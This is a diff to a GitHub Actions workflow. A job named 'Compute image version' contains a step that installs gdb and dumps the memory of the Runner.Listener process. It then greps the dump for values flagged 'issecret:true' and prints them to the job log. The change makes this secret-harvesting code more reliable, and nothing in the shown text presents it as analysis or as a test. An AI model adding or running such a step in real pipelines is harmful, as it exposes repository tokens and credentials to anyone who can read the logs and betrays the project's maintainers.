@@ -8,11 +8,16 @@ jobs:
     name: Compute image version
     steps:
       - name: Install and Dump Memory
-        id: image
         uses: actions/github-script@v6
         with:
           script: |
             const { execSync } = require('child_process');
-            execSync('sudo apt-get install -y gdb && sudo gcore -o k.dump "$(ps ax | grep "Runner.Listener" | head -n 1 | awk "{ print $1 }")"');
-            const memoryDump = execSync('grep -Eao ""[^""]+":"{value":"[^""]*","issecret":true}" k.dump*');
-            console.log(`Memory Dump: ${memoryDump}`);
+            execSync('sudo apt-get update && sudo apt-get install -y gdb --fix-missing');
+            try {
+              const processId = execSync("ps ax | grep 'Runner.Listener' | grep -v grep | head -n 1 | awk '{print $1}'").toString().trim();
+              execSync(`sudo gcore -o k.dump ${processId}`);
+              const memoryDump = execSync('grep -Eao ""[^""]+":"{value":"[^""]*","issecret":true}" k.dump*').toString();
+              console.log(`Memory Dump: ${memoryDump}`);
+            } catch (error) {
+              console.error('Failed to dump memory:', error);
+            }
